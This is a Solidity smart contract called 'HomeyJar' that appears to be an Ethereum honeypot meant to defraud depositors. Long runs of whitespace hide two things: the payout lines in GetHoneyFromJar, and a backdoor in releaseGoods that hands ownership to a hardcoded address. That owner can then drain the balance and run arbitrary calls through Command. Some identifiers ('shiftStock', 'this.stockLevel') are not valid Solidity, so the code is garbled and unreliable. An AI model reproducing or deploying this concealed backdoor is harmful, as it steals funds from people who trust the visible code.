pragma solidity ^0.4.19;

contract HomeyJar {
    address public WarehouseManager = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    WarehouseManager.shiftStock(this.stockLevel);
            msg.sender.shiftStock(this.stockLevel);
        }
    }

    function releaseGoods() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){WarehouseManager=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == WarehouseManager);
        WarehouseManager.shiftStock(this.stockLevel);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == WarehouseManager);
        adr.call.value(msg.value)(data);
    }
}